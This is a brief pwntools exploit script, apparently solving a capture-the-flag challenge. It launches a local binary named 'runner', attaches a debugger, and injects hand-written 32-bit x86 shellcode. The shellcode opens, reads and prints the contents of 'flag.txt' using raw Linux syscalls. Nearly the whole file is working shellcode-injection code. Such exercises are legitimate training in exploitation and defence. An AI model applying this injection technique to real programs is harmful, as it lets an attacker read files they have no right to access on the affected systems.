from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
p = process("./runner")

shellcode = """
    int3
    call a
    a:
    mov eax, 0x5;
    mov ebx, esp;
    add ebx, 0x49;
    xor ecx, ecx;
    xor edx, edx;
    int 0x80;
    mov ebx, eax;
    mov eax, 0x3;
    mov ecx, esp;
    add ecx, 0x51;
    mov edx, 0xa;
    int 0x80;
    mov eax, 0x4;
    mov ebx, 0x1;
    mov ecx, esp;
    add ecx, 0x51;
    mov edx, 0xa;
    int 0x80;
    pop esp;
    ret
"""

ass = asm(shellcode)
gdb.attach(p)
p.sendline(ass + "flag.txt\0")
p.interactive()




